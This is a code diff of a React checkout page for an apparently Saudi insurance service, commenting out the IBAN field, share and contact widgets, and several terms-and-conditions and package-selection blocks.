@@ -7,9 +7,6 @@ import useScrollPos from "../../hooks/useScrollPos";
 import { useEffect } from "react";
 import { isAdminError, message } from "@/real-time/context/signals";
 import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
-import PaymentShare from "./Payment/PaymentShare";
-import PaymentContacts from "./Payment/PaymentContacts";
-import { maskPhoneNumber } from "@/lib/helpers";
 
 const PaymentPage = () => {
   const { state } = useLocation();
@@ -26,13 +23,13 @@ const PaymentPage = () => {
     e.preventDefault();
     const formData = new FormData(e.target);
     const discount = formData.get("discount");
-    const iban = formData.get("iban");
+    // const iban = formData.get("iban");
     const paymentMethod = formData.get("payment-method");
     const smartPackage = formData.get("smart-package");
 
     const data = {
       discount,
-      iban,
+      // iban,
       paymentMethod,
       smartPackage,
     };
@@ -71,7 +68,7 @@ const PaymentPage = () => {
             } ${scrollPosition >= 1300 ? "self-end pb-6" : ""}`}
           >
             <PaymentDetails price={state?.total} />
-            <PaymentShare />
+            {/* <PaymentShare /> */}
           </div>
         </div>
 
@@ -96,15 +93,15 @@ const PaymentPage = () => {
 
           <div className="lg:hidden">
             <PaymentDetails price={state?.total} />
-            <PaymentShare />
+            {/* <PaymentShare /> */}
           </div>
 
-          <PaymentContacts phone={maskPhoneNumber(state?.phone)} />
+          {/* <PaymentContacts phone={maskPhoneNumber(state?.phone)} /> */}
 
           <fieldset className="mt-6">
             <legend className="sr-only">terms and conditions Checkbox</legend>
 
-            <div className="space-y-2">
+            {/* <div className="space-y-2">
               <label
                 htmlFor="Option1"
                 className="flex cursor-pointer items-start gap-4"
@@ -126,7 +123,7 @@ const PaymentPage = () => {
                   </strong>
                 </div>
               </label>
-            </div>
+            </div> */}
           </fieldset>
 
           <div className="mt-4">
@@ -158,11 +155,12 @@ const PaymentPage = () => {
               </div>
             </span>
           </div>
-          <p className="mt-2 bg-deep-orange-500 text-white rounded-lg px-4 py-2 w-fit text-sm animate-pulse">
+          {/*   <p className="mt-2 bg-deep-orange-500 text-white rounded-lg px-4 py-2 w-fit text-sm animate-pulse">
             "نعتذر من عملائنا الأعزاء، نحن لا نقبل التعامل بالبطاقات الصادرة من
             بنك الراجحي في الوقت الراهن. نشكركم على تفهمكم."
           </p>
 
+         
           <div className="border rounded-lg border-gray-400 py-4 px-2 mt-6">
             <div className="flex gap-4">
               <input type="radio" name="smart-package" id="smart-package" />
@@ -223,7 +221,7 @@ const PaymentPage = () => {
               رسوم الباقة الذكية المدفوعة غير قابلة للاسترداد، يرجى الاطلاع على{" "}
               <strong className="underline">للشروط والأحكام.</strong>
             </p>
-          </div>
+          </div> 
 
           <label
             htmlFor="terms-condns"
@@ -251,7 +249,7 @@ const PaymentPage = () => {
                 <span className="text-main">شروط وأحكام</span> شركة التأمين
               </p>
             </div>
-          </label>
+          </label>*/}
         </div>
       </div>
 
